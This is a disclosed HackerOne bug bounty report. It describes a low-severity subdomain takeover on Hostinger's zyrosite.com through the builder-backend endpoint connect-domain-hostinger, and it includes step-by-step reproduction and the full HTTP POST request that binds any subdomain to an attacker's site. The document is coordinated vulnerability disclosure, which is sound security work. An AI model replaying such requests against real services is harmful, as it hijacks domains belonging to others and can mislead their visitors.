# Able to take over .zyrosite.com subdomains via `/v3/publish/connect-domain-hostinger` API endpoint

## Report Details
- **Report ID**: 1767771
- **URL**: https://hackerone.com/reports/1767771
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-11-09T13:02:52.700Z
- **Disclosed**: 2022-12-05T14:57:25.804Z

## Reporter
- **Username**: tosun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hostinger

## Vulnerability Information
## Summary:
Hey team, I was able to take over *anysubdomain*.zyrosite.com via https://builder-backend.hostinger.com/v3/publish/connect-domain-hostinger endpoint.

I was connected following subdomains to my site for confirming this vulnerability, ;
`test.zyrosite.com` and `connect.zyrosite.com` ( this was my fault )

you'll see a text like`tosun pwn` on these subdomains, but If you follow the below steps, you can also connect your site to test.zyrosite.com`

## Steps To Reproduce:

> ###`you need to single shared hosting service to reproduce this issue`

1. Login to your hostinger account from hpanel.hostinger.com
2. Create a website then go to website builder / editor ( you'll be go to like this https://builder.hostinger.com/{siteId} )
3. Publish your site with top right button

Now get your cookies and paste to below HTTP request

```
POST /v3/publish/connect-domain-hostinger HTTP/2
Host: builder-backend.hostinger.com
Cookie: {use your cookies on builder page)
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 61
Origin: https://builder.hostinger.com
Referer: https://builder.hostinger.com/
Te: trailers

{"domain":"test.zyrosite.com","siteId":"{yourSiteId}"}
``` 

my hostinger account email: █████
my siteId: `█████`

## Impact

able to takeover *.zyrosite.com subdomains.

## Attachments
No attachments
